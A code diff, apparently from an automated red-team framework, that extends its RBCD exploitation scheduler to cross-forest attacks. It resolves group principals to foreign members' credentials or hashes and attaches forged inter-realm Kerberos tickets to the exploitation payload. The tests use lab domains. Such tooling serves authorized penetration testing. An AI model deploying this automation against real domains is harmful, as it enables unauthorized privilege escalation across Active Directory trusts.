@@ -72,6 +72,8 @@ pub async fn auto_rbcd_exploitation(
                         vuln_id = %item.vuln_id,
                         source = %item.source_user,
                         target = %item.target_computer,
+                        via_group = ?item.via_group,
+                        kerberos = item.kerberos_ccache.is_some(),
                         "RBCD exploitation dispatched"
                     );
                     dispatcher
@@ -103,6 +105,17 @@ pub(crate) struct RbcdWork {
     pub dc_ip: Option<String>,
     pub credential: Option<ares_core::models::Credential>,
     pub hash: Option<ares_core::models::Hash>,
+    /// Set when `source_user` was a group name and the credential was
+    /// resolved through `foreign_group_membership` expansion. Surfaced in
+    /// the payload so logs make the indirection legible.
+    pub via_group: Option<String>,
+    /// Absolute path to an inter-realm `.ccache` already forged for this
+    /// (member-realm → target-realm) pair, if any. Set when the resolved
+    /// credential's domain differs from the target domain — cross-forest
+    /// RBCD requires Kerberos auth because SID filtering blocks the
+    /// NTLM/PAC-via-trust path. Threaded into the payload as
+    /// `kerberos_ccache` for the downstream tool wrapper.
+    pub kerberos_ccache: Option<String>,
 }
 
 /// Select RBCD exploitation work items for this tick.
@@ -160,15 +173,14 @@ pub(crate) fn select_rbcd_work(state: &StateInner) -> Vec<RbcdWork> {
                 .unwrap_or("")
                 .to_string();
 
-            let credential = state.find_source_credential(&source_user, &domain);
-            let hash = if credential.is_none() {
-                state.find_source_hash(&source_user, &domain)
-            } else {
-                None
-            };
-            if credential.is_none() && hash.is_none() {
-                return None;
-            }
+            let (credential, hash, via_group) =
+                match state.resolve_principal_to_credential(&source_user, &domain) {
+                    Some((c, g)) => (Some(c), None, g),
+                    None => match state.resolve_principal_to_hash(&source_user, &domain) {
+                        Some((h, g)) => (None, Some(h), g),
+                        None => return None,
+                    },
+                };
 
             let dc_ip = state
                 .domain_controllers
@@ -182,6 +194,30 @@ pub(crate) fn select_rbcd_work(state: &StateInner) -> Vec<RbcdWork> {
                     .map(|h| (h.hostname.as_str(), h.ip.as_str())),
             );
 
+            // Cross-realm: when the resolved credential lives in a different
+            // domain than the RBCD target, the LDAP write needs Kerberos
+            // auth — a pre-forged inter-realm ccache produced by
+            // `create_inter_realm_ticket`. ADCS uses the same pattern; see
+            // `automation/adcs.rs:262` for the parallel lookup.
+            let cred_domain_l = credential
+                .as_ref()
+                .map(|c| c.domain.to_lowercase())
+                .or_else(|| hash.as_ref().map(|h| h.domain.to_lowercase()))
+                .unwrap_or_default();
+            let target_l = domain.to_lowercase();
+            let kerberos_ccache = if !cred_domain_l.is_empty() && cred_domain_l != target_l {
+                state
+                    .kerberos_tickets
+                    .iter()
+                    .find(|t| {
+                        t.source_domain.to_lowercase() == cred_domain_l
+                            && t.target_domain.to_lowercase() == target_l
+                    })
+                    .map(|t| t.ticket_path.clone())
+            } else {
+                None
+            };
+
             Some(RbcdWork {
                 vuln_id: vuln.vuln_id.clone(),
                 dedup_key,
@@ -192,6 +228,8 @@ pub(crate) fn select_rbcd_work(state: &StateInner) -> Vec<RbcdWork> {
                 dc_ip,
                 credential,
                 hash,
+                via_group,
+                kerberos_ccache,
             })
         })
         .collect()
@@ -224,6 +262,12 @@ pub(crate) fn build_rbcd_payload(item: &RbcdWork) -> serde_json::Value {
     } else if let Some(ref hash) = item.hash {
         payload["username"] = json!(hash.username);
         payload["hash"] = json!(hash.hash_value);
+    }
+    if let Some(ref ccache) = item.kerberos_ccache {
+        payload["kerberos_ccache"] = json!(ccache);
+    }
+    if let Some(ref grp) = item.via_group {
+        payload["via_group"] = json!(grp);
     }
     payload
 }
@@ -632,6 +676,8 @@ mod tests {
             dc_ip: Some("192.168.58.10".into()),
             credential: Some(make_cred("alice", "Pw", "contoso.local")),
             hash: None,
+            via_group: None,
+            kerberos_ccache: None,
         }
     }
 
@@ -687,5 +733,139 @@ mod tests {
         let p = build_rbcd_payload(&w);
         assert!(p.get("dc_ip").is_none());
         assert!(p.get("target_ip").is_none());
+        assert!(p.get("kerberos_ccache").is_none());
+        assert!(p.get("via_group").is_none());
+    }
+
+    #[test]
+    fn build_rbcd_payload_includes_kerberos_ccache_and_via_group() {
+        let mut w = baseline_rbcd_work();
+        w.via_group = Some("CrossForestAdmins".into());
+        w.kerberos_ccache = Some("/tmp/alice@CONTOSO.LOCAL.ccache".into());
+        let p = build_rbcd_payload(&w);
+        assert_eq!(p["via_group"], "CrossForestAdmins");
+        assert_eq!(p["kerberos_ccache"], "/tmp/alice@CONTOSO.LOCAL.ccache");
+    }
+
+    // ── cross-realm group-expansion integration ──────────────────────────
+
+    fn rbcd_vuln_with_group_source(
+        vuln_id: &str,
+        group: &str,
+        target_computer: &str,
+        target_domain: &str,
+    ) -> ares_core::models::VulnerabilityInfo {
+        let mut details = std::collections::HashMap::new();
+        details.insert("source".into(), serde_json::json!(group));
+        details.insert("target".into(), serde_json::json!(target_computer));
+        details.insert("target_type".into(), serde_json::json!("Computer"));
+        details.insert("domain".into(), serde_json::json!(target_domain));
+        ares_core::models::VulnerabilityInfo {
+            vuln_id: vuln_id.into(),
+            vuln_type: "rbcd".into(),
+            target: target_computer.into(),
+            discovered_by: "test".into(),
+            discovered_at: chrono::Utc::now(),
+            details,
+            recommended_agent: String::new(),
+            priority: 1,
+        }
+    }
+
+    fn fsp_vuln(
+        vuln_id: &str,
+        group: &str,
+        group_domain: &str,
+        member: &str,
+        member_domain: &str,
+    ) -> ares_core::models::VulnerabilityInfo {
+        let mut details = std::collections::HashMap::new();
+        details.insert("source".into(), serde_json::json!(member));
+        details.insert("source_domain".into(), serde_json::json!(member_domain));
+        details.insert("target".into(), serde_json::json!(group));
+        details.insert("domain".into(), serde_json::json!(group_domain));
+        ares_core::models::VulnerabilityInfo {
+            vuln_id: vuln_id.into(),
+            vuln_type: "foreign_group_membership".into(),
+            target: group.into(),
+            discovered_by: "test".into(),
+            discovered_at: chrono::Utc::now(),
+            details,
+            recommended_agent: String::new(),
+            priority: 1,
+        }
+    }
+
+    #[test]
+    fn select_rbcd_resolves_group_source_via_foreign_member_and_attaches_ccache() {
+        // Cross-forest RBCD: RBCD vuln carries a group name as `source`
+        // (BloodHound emits ACL edges with group sAMAccountNames). The
+        // foreign_group_membership vuln identifies the foreign member who
+        // is the actual exploitable principal. The selector must resolve
+        // to that member's credential, surface via_group, and pick up the
+        // pre-forged inter-realm ccache.
+        let mut s = StateInner::new("op".into());
+        let rbcd =
+            rbcd_vuln_with_group_source("v1", "CrossForestAdmins", "dc01$", "fabrikam.local");
+        s.discovered_vulnerabilities
+            .insert(rbcd.vuln_id.clone(), rbcd);
+        let fsp = fsp_vuln(
+            "v2",
+            "CrossForestAdmins",
+            "fabrikam.local",
+            "alice",
+            "contoso.local",
+        );
+        s.discovered_vulnerabilities
+            .insert(fsp.vuln_id.clone(), fsp);
+        s.credentials
+            .push(make_cred("alice", "P@ssw0rd!", "contoso.local"));
+        s.kerberos_tickets.push(ares_core::models::KerberosTicket {
+            source_domain: "contoso.local".into(),
+            target_domain: "fabrikam.local".into(),
+            username: "alice".into(),
+            ticket_path: "/tmp/alice.ccache".into(),
+            forged_at: None,
+        });
+
+        let work = select_rbcd_work(&s);
+        assert_eq!(work.len(), 1);
+        let w = &work[0];
+        assert_eq!(w.source_user, "CrossForestAdmins");
+        let cred = w.credential.as_ref().expect("must resolve credential");
+        assert_eq!(cred.username, "alice");
+        assert_eq!(cred.domain, "contoso.local");
+        assert_eq!(w.via_group.as_deref(), Some("CrossForestAdmins"));
+        assert_eq!(w.kerberos_ccache.as_deref(), Some("/tmp/alice.ccache"));
+
+        let payload = build_rbcd_payload(w);
+        assert_eq!(payload["username"], "alice");
+        assert_eq!(payload["password"], "P@ssw0rd!");
+        assert_eq!(payload["via_group"], "CrossForestAdmins");
+        assert_eq!(payload["kerberos_ccache"], "/tmp/alice.ccache");
+    }
+
+    #[test]
+    fn select_rbcd_same_realm_omits_ccache() {
+        // alice@contoso.local has GenericAll on SQL01$@contoso.local — no
+        // realm crossing, so no ccache lookup should happen even if a
+        // forged ticket is present in state.
+        let mut s = StateInner::new("op".into());
+        let v = make_rbcd_vuln("v1", "alice", "SQL01$", "contoso.local", "Computer");
+        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
+        s.credentials
+            .push(make_cred("alice", "Pw", "contoso.local"));
+        s.kerberos_tickets.push(ares_core::models::KerberosTicket {
+            source_domain: "fabrikam.local".into(),
+            target_domain: "contoso.local".into(),
+            username: "bob".into(),
+            ticket_path: "/tmp/unrelated.ccache".into(),
+            forged_at: None,
+        });
+
+        let work = select_rbcd_work(&s);
+        assert_eq!(work.len(), 1);
+        assert!(work[0].via_group.is_none());
+        assert!(work[0].kerberos_ccache.is_none());
     }
 }
